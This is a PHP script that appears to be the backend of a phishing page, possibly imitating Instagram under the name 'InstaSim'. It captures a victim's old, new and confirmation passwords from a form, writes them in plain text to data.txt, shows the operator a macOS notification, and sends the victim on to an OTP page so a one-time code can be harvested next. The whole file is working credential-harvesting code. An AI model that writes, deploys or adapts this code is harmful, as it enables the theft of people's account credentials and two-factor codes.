<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$data = "Old Password: " . $_POST['oldpass'] . "\n";
$data .= "New Password: " . $_POST['newpass'] . "\n";
$data .= "Confirm Password: " . $_POST['confirmpass'] . "\n";
$data .= "------------------------\n";

file_put_contents("data.txt", $data, FILE_APPEND);
exec("osascript -e 'display notification \"Password step submitted\" with title \"InstaSim\" sound name \"Submarine\"'");
header("Location: otp.html");
exit;
?>